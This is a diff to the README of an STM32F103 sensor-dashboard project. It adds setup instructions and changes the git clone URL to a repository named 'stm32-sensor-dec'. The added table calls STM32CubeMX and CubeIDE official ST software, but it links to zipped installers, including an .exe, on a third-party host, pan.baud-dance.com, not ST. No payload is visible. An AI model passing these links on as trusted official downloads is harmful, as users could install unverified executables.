@@ -3,6 +3,19 @@
 **STM32F103 多传感器监测台**：0.96" OLED 显示、MAX30102 心率血氧、DHT11 温湿度、GL5516 光照、MPU6050 六轴、槽型光耦测速，外加 SG90 舵机与有源蜂鸣器，旋钮切页。
 代码按**驱动 / 界面 / 调度**分层，新增传感器或页面时不需要动已有模块。
 
+> 源码：<https://github.com/apodxx/stm32-sensor-dec>
+
+## 需要装什么
+
+只需要两个 ST 官方软件，装完就能编译下载：
+
+| 软件 | 用途 | 下载 |
+|---|---|---|
+| STM32CubeMX 6.17.0 | 图形化配置引脚/时钟 | [下载](https://pan.baud-dance.com/d/r2/cube/stm32cubemx-win-v6-17-0.zip) |
+| STM32CubeIDE 2.1.1 | 编辑 / 编译 / 下载 / 调试 | [下载](https://pan.baud-dance.com/d/r2/cube/st-stm32cubeide_2.1.1_28236_20260312_0043_x86_64.exe.zip) |
+
+CubeIDE 自带 GCC / CMake / Ninja，不用另外配工具链。
+
 ## 文档
 
 | 文档 | 内容 |
@@ -13,8 +26,8 @@
 ## 快速开始
 
 ```bash
-git clone https://github.com/<你的用户名>/stm32-sensor-deck.git
-cd stm32-sensor-deck
+git clone https://github.com/apodxx/stm32-sensor-dec.git
+cd stm32-sensor-dec
 cmake --preset debug
 cmake --build build/debug/build
 ```
